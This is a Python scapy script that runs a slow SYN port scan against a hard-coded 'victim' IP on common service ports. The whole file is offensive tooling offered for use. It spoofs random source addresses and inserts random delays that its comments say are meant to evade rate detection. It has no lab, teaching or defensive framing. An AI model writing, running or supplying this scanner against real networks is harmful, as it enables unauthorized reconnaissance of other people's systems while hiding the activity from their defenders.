import scapy.all as scapy
import time
import random

# Function to perform the SYN scan attack with random delays
def syn_scan_attack(target_ip, target_ports):
    try:
        # Randomize the source IP and source port to mimic different attackers
        src_ip = f"192.168.1.{random.randint(2, 254)}"
        src_port = random.randint(1024, 65535)

        # Loop over the target ports
        for target_port in target_ports:
            # Create the SYN packet (non-fragmented for a port scan)
            ip = scapy.IP(src=src_ip, dst=target_ip)
            syn = scapy.TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 65535))

            # Send the packet
            scapy.send(ip / syn, verbose=False)
            print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

            # Introduce a random delay between 1 and 3 seconds to evade rate detection
            delay = random.uniform(1, 3)
            time.sleep(delay)

    except OSError as e:
        # Handle OSError properly by converting it to a string and printing it
        print(f"Error during SYN scan attack: {str(e)}")
    
    except Exception as e:
        # General exception handling for other unexpected errors
        print(f"An unexpected error occurred: {str(e)}")


# Main function to initiate the attack
def main():
    # Set the target IP and ports (a range of ports for the port scan)
    target_ip = "192.168.100.5"  # Change this to your victim's IP
    target_ports = [80, 443, 8080, 22, 21, 3306]  # Common ports for scan

    print("Starting slow SYN scan attack with random delays...")

    # Run the SYN scan attack
    syn_scan_attack(target_ip, target_ports)


if __name__ == "__main__":
    main()
